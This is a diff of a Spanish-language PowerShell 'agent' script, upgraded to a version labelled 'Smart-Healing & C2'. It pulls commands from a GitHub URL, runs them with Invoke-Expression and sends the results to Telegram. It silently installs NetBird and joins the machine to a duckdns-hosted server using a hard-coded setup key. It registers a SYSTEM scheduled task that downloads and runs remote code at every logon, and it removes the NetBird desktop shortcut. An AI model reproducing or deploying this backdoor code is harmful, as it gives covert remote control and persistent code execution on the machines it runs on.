@@ -1,5 +1,6 @@
 # ===========================================================================
-# SCRIPT DE RED CONTICS 2026 - AGENTE V5.5 (VISUAL REPORT)
+# SCRIPT DE RED CONTICS 2026 - AGENTE V6 (SMART-HEALING & C2)
+# VERSION FINAL - OPTIMIZADA PARA VELOCIDAD Y ESTABILIDAD
 # ===========================================================================
 
 # --- [1] CONFIGURACION DE RUTAS ---
@@ -23,66 +24,76 @@ function Send-Telegram {
 
 Clear-Host
 Write-Host "======================================================" -ForegroundColor Cyan
-Write-Host "      SISTEMA DE DESPLIEGUE CONTICS 2026" -ForegroundColor Cyan
+Write-Host "      SISTEMA INTELIGENTE CONTICS 2026" -ForegroundColor Cyan
 Write-Host "======================================================" -ForegroundColor Cyan
 
-# --- [3] RECEPTOR DE TAREAS (C2) ---
-Write-Host "`n[1/4] Buscando ordenes en GitHub..." -ForegroundColor Yellow
+# --- [3] BOT DE COMANDOS (C2) ---
+Write-Host "`n[1/4] Consultando Bot de Comandos (C2)..." -ForegroundColor Yellow
 try {
     $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
     if ($TareaData) {
         $Tarea = $TareaData.Content.Trim()
         if ($Tarea -ne "NONE" -and $Tarea -ne "") {
-            Write-Host " [+] Ejecutando orden: $Tarea" -ForegroundColor White
+            Write-Host " [+] Ejecutando instruccion: $Tarea" -ForegroundColor White
             $Out = Invoke-Expression $Tarea 2>&1 | Out-String
-            $MsgC2 = "ORDEN EJECUTADA EN: $env:COMPUTERNAME`nComando: $Tarea`nResultado: $Out"
-            Send-Telegram -Message $MsgC2
+            Send-Telegram -Message "ORDEN C2 EN: $env:COMPUTERNAME`n`nComando: $Tarea`n`nResultado: $Out"
             Write-Host " [+] Resultado enviado a Telegram." -ForegroundColor Green
         } else {
-            Write-Host " [+] Sin ordenes pendientes." -ForegroundColor Gray
+            Write-Host " [+] Sin instrucciones pendientes." -ForegroundColor Gray
         }
     }
 } catch { 
-    Write-Host " [-] Error en lectura de tareas." -ForegroundColor Red
+    Write-Host " [-] Error al conectar con C2." -ForegroundColor Red
 }
 
-# --- [4] LOGICA DE RED (NETBIRD) ---
-Write-Host "`n[2/4] Verificando conectividad NetBird..." -ForegroundColor Yellow
+# --- [4] LOGICA DE AUTOCURACION (NETBIRD) ---
+Write-Host "`n[2/4] Verificando salud de la red..." -ForegroundColor Yellow
 $mUrl = 'https://contics-admin.duckdns.org'
 $sKey = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
 $nbPath = 'C:\Program Files\NetBird\netbird.exe'
 
+# Verificar instalacion
 if (!(Test-Path $nbPath)) {
-    Write-Host " [+] Instalador no encontrado. Descargando..." -ForegroundColor White
+    Write-Host " [-] NetBird no detectado. Instalando..." -ForegroundColor Red
     $installer = "$env:TEMP\nb.exe"
     Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
     Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
     Start-Sleep -Seconds 5
 }
 
-Write-Host " [+] Conectando al servidor CONTICS..." -ForegroundColor White
-& $nbPath down | Out-Null
-& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null
+# Revisar si ya existe conexion activa
+$status = & $nbPath status 2>&1
+$hasIP = $status | Select-String 'NetBird IP: 100\.'
+$isConnected = $status | Select-String 'Management: Connected'
 
-# --- [5] REPORTE DE IP Y FEEDBACK ---
-Write-Host "`n[3/4] Generando reporte de nodo..." -ForegroundColor Yellow
-Start-Sleep -Seconds 5
-$status = & $nbPath status
-$lineaIP = $status | Select-String 'NetBird IP:'
-
-if ($lineaIP) {
-    $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
-    $MsgOk = "NODO CONECTADO`nPC: $env:COMPUTERNAME`nIP: $nbIP"
-    Send-Telegram -Message $MsgOk
+if ($hasIP -and $isConnected) {
+    # RED SANA: Solo notificar estado
+    $nbIP = (($hasIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
+    Write-Host " [+] RED ESTABLE: $nbIP" -ForegroundColor Green
+    Send-Telegram -Message "NODO ONLINE: $env:COMPUTERNAME`nIP: $nbIP`nEstado: Sesion mantenida (Smart-Healing)."
+} else {
+    # RED CAIDA: Reestablecer
+    Write-Host " [!] Conexion perdida. Reestableciendo tunel..." -ForegroundColor Red
+    & $nbPath down | Out-Null
+    $upResult = & $nbPath up --management-url $mUrl --setup-key $sKey 2>&1
     
-    Write-Host " [+] ESTATUS:      " -NoNewline; Write-Host "CONECTADO" -ForegroundColor Green
-    Write-Host " [+] IP ASIGNADA:  " -NoNewline; Write-Host "$nbIP" -ForegroundColor Yellow
-    Write-Host " [+] TELEGRAM:     " -NoNewline; Write-Host "REPORTADO" -ForegroundColor Green
-    $nbIP | clip
+    if ($upResult -like "*login*") {
+        Send-Telegram -Message "ALERTA: PC $env:COMPUTERNAME requiere LOGIN manual.`nLink: $mUrl"
+        Write-Host " [!] Requiere autorizacion manual en panel web." -ForegroundColor Yellow
+    }
+    
+    Start-Sleep -Seconds 5
+    $finalStatus = & $nbPath status
+    $lineaIP = $finalStatus | Select-String 'NetBird IP:'
+    if ($lineaIP) {
+        $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
+        Send-Telegram -Message "NODO RECONECTADO: $env:COMPUTERNAME`nIP: $nbIP"
+        Write-Host " [+] Nueva IP asignada: $nbIP" -ForegroundColor Yellow
+    }
 }
 
-# --- [6] PERSISTENCIA ---
-Write-Host "`n[4/4] Actualizando persistencia..." -ForegroundColor Yellow
+# --- [5] PERSISTENCIA ---
+Write-Host "`n[3/4] Asegurando persistencia..." -ForegroundColor Yellow
 $TaskName = "Contics_AtLogon"
 $ScriptCmd = "iex (iwr '$GitHubRawUrl' -UseBasicParsing)"
 
@@ -93,13 +104,15 @@ $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
-Write-Host " [+] Persistencia:  " -NoNewline; Write-Host "ACTIVA" -ForegroundColor Green
+Write-Host " [+] Persistencia: ACTIVA" -ForegroundColor Green
 
-# --- [7] FINALIZACION ---
+# --- [6] CIERRE ---
+Write-Host "`n[4/4] Finalizando tareas..." -ForegroundColor Yellow
+if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
+
 Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
-Write-Host " Proceso completado. Abriendo panel de gestion..." -ForegroundColor White
-Start-Process $mUrl 
+Write-Host " ESTADO FINAL: NODO CONTICS EN LINEA" -ForegroundColor White
 Write-Host "------------------------------------------------------" -ForegroundColor Cyan
 
-Write-Host "`nPresione ENTER para finalizar..." -ForegroundColor Gray
+Write-Host "`nPresione ENTER para terminar..." -ForegroundColor Gray
 Read-Host
